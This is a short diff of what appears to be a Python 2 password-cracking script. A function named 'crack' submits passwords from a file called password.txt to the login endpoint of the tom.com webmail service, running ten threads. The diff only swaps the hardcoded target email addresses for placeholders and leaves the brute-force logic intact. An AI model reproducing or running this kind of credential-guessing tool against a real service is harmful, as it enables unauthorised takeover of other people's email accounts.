@@ -32,7 +32,7 @@ def crack(url,username,password):
 	username = username.strip()
 	password = password.strip()
 	print password
-	values = {'username':'g121f@tom.com','password':password}
+	values = {'username':'XXXX@tom.com','password':password}
 	data = urllib.urlencode(values)
 	cookiejar = cookielib.CookieJar()
 	urlOpener = urllib2.build_opener(urllib2.HTTPCookieProcessor(cookiejar))
@@ -94,7 +94,7 @@ def main():
  
 	FILE = 'password.txt'
 	password = open(FILE)
-	uname = 'sr277590732@tom.com_discard'
+	uname = 'discard'
 	url = 'http://web.mail.tom.com/webmail/login/loginService.action' 
 	thread_count = 10
 	
